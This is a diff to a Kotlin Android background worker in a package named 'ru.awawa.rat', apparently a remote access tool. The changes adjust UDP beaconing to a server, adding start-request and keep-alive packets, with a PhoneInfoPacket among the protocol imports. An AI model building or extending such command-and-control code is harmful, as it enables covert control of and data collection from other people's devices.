@@ -7,10 +7,7 @@ import androidx.work.WorkerParameters
 import ru.awawa.rat.helper.BuildInfo
 import ru.awawa.rat.helper.Preferences
 import ru.awawa.rat.worker.helper.State
-import ru.awawa.rat.worker.helper.protocol.MagicNumber
-import ru.awawa.rat.worker.helper.protocol.PacketHelper
-import ru.awawa.rat.worker.helper.protocol.PhoneInfoPacket
-import ru.awawa.rat.worker.helper.protocol.StartPacket
+import ru.awawa.rat.worker.helper.protocol.*
 import java.net.*
 
 
@@ -33,8 +30,6 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
         val buffer = ByteArray(2048)
         val rcvPacket = DatagramPacket(buffer, 2048)
 
-        val pckt = StartPacket(this.state.id)
-        this.socket.send(DatagramPacket(pckt.data, pckt.data.size, this.state.serverAddress, this.state.serverPort))
         while (state.running) {
             try {
                 socket.receive(rcvPacket)
@@ -74,17 +69,24 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
 
     private fun sleep() {
 
-        if (state.connectionState == State.ConnectionState.CONNECTING) {
+        if (state.needToSendStartRequest()) {
+            this.state.startSent()
             this.state.setStateWaiting()
             val buffer = StartPacket(Preferences.get(Preferences.PreferencesField.ID) ?: "").data
-            val packet = DatagramPacket(buffer, buffer.size)
-            packet.address = state.serverAddress
-            packet.port = 43584
+            val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)
+
+            this.socket.send(packet)
+        }
+
+        if (state.needToSendKeepAlive()) {
+            this.state.keepAliveSent()
+            val buffer = KeepAlivePacket(state.id).data
+            val packet = DatagramPacket(buffer, buffer.size, state.serverAddress, state.serverPort)
 
             this.socket.send(packet)
         }
 
         Log.w(TAG, "Nothing received...")
-        Thread.sleep(1000)
+        Thread.sleep(500)
     }
 }
